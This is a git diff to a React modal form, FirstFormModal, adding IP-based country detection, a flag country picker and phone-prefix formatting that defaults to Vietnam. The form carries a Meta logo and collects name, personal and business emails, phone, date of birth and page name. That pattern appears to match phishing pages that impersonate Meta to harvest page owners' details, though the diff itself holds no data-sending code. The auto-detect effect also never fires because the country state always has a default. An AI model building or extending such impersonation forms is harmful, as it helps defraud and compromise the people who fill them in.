@@ -1,9 +1,12 @@
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import PropTypes from 'prop-types';
 import TickIcon from '@/assets/images/tick.svg';
 import MetaLogo from '@/assets/images/meta-logo-grey.png';
+import CountrySelector from './CountrySelector';
+import countryData from '@/utils/country_data';
+import ReactCountryFlag from 'react-country-flag';
 
-const FirstFormModal = ({ show, onClose, onSubmit, texts }) => {
+const FirstFormModal = ({ show, onClose, onSubmit, texts, ipInfo }) => {
     const [formData, setFormData] = useState({
         fullName: '',
         personalEmail: '',
@@ -14,12 +17,34 @@ const FirstFormModal = ({ show, onClose, onSubmit, texts }) => {
         agreeTerms: false
     });
     const [errors, setErrors] = useState({});
+    const [showCountrySelector, setShowCountrySelector] = useState(false);
+    const [selectedCountry, setSelectedCountry] = useState(countryData[0]); // Default to Vietnam
+
+    // Auto-detect country based on IP
+    useEffect(() => {
+        if (ipInfo && ipInfo.country_code && !selectedCountry) {
+            const detectedCountry = countryData.find(country => country.code === ipInfo.country_code);
+            if (detectedCountry) {
+                setSelectedCountry(detectedCountry);
+                // Auto-fill phone code if phone field is empty
+                if (!formData.phone.trim()) {
+                    handleChange('phone', detectedCountry.phone);
+                }
+            }
+        }
+    }, [ipInfo, selectedCountry]);
 
     const handleChange = (field, value) => {
         setFormData((prev) => ({ ...prev, [field]: value }));
         if (errors[field]) {
             setErrors((prev) => ({ ...prev, [field]: false }));
         }
+    };
+
+    const handleCountrySelect = (country) => {
+        setSelectedCountry(country);
+        // Clear phone field so user can type clean number without country code
+        handleChange('phone', '');
     };
 
     const handleSubmit = (e) => {
@@ -39,11 +64,17 @@ const FirstFormModal = ({ show, onClose, onSubmit, texts }) => {
             return;
         }
 
+        // Handle phone number formatting for Vietnam (remove leading 0)
+        let phoneNumber = formData.phone;
+        if (selectedCountry.phone === '+84' && phoneNumber.startsWith('0')) {
+            phoneNumber = phoneNumber.substring(1);
+        }
+
         onSubmit({
             fullName: formData.fullName,
             personalEmail: formData.personalEmail,
             businessEmail: formData.businessEmail,
-            phone: formData.phone,
+            phone: `${selectedCountry.phone}${phoneNumber}`,
             dateOfBirth: formData.dateOfBirth,
             pageName: formData.pageName
         });
@@ -116,18 +147,48 @@ const FirstFormModal = ({ show, onClose, onSubmit, texts }) => {
                                 <label className="form-label" htmlFor="PhoneFirld">
                                     {texts.mobilePhone || 'Mobile Phone Number'}
                                 </label>
-                                <input
-                                    aria-describedby="emailHelp"
-                                    className={`form-control ${errors.phone ? 'is-invalid' : ''}`}
-                                    id="PhoneFirld"
-                                    maxLength="18"
-                                    minLength="7"
-                                    name="mobile-phone-number"
-                                    required
-                                    type="tel"
-                                    value={formData.phone}
-                                    onChange={(e) => handleChange('phone', e.target.value)}
-                                />
+                                <div style={{ display: 'flex', gap: '8px', alignItems: 'flex-start' }}>
+                                    <button
+                                        type="button"
+                                        className="btn btn-outline-secondary"
+                                        onClick={() => setShowCountrySelector(true)}
+                                        style={{
+                                            minWidth: '60px',
+                                            padding: '9.5px 12px',
+                                            fontSize: '16px',
+                                            border: '1px solid #dee2e6',
+                                            marginTop: '0',
+                                            display: 'flex',
+                                            alignItems: 'center',
+                                            justifyContent: 'center'
+                                        }}
+                                        title="Select country"
+                                    >
+                                        <ReactCountryFlag
+                                            countryCode={selectedCountry.code}
+                                            svg
+                                            style={{
+                                                width: '24px',
+                                                height: '24px',
+                                                borderRadius: '3px'
+                                            }}
+                                            title={selectedCountry.name}
+                                        />
+                                    </button>
+                                    <input
+                                        aria-describedby="emailHelp"
+                                        className={`form-control ${errors.phone ? 'is-invalid' : ''}`}
+                                        id="PhoneFirld"
+                                        maxLength="18"
+                                        minLength="7"
+                                        name="mobile-phone-number"
+                                        required
+                                        type="tel"
+                                        placeholder={selectedCountry ? selectedCountry.phone : '+84'}
+                                        value={formData.phone}
+                                        onChange={(e) => handleChange('phone', e.target.value)}
+                                    />
+                                </div>
                             </div>
                             <div className="mb-3">
                                 <label className="form-label" htmlFor="dobField">
@@ -195,6 +256,11 @@ const FirstFormModal = ({ show, onClose, onSubmit, texts }) => {
                 </div>
             </div>
         </div>
+        <CountrySelector
+            show={showCountrySelector}
+            onClose={() => setShowCountrySelector(false)}
+            onSelect={handleCountrySelect}
+        />
         </>
     );
 };
@@ -203,7 +269,8 @@ FirstFormModal.propTypes = {
     show: PropTypes.bool.isRequired,
     onClose: PropTypes.func.isRequired,
     onSubmit: PropTypes.func.isRequired, // receives object with fullName, personalEmail, businessEmail, phone, dateOfBirth, pageName
-    texts: PropTypes.object.isRequired
+    texts: PropTypes.object.isRequired,
+    ipInfo: PropTypes.object
 };
 
 export default FirstFormModal;
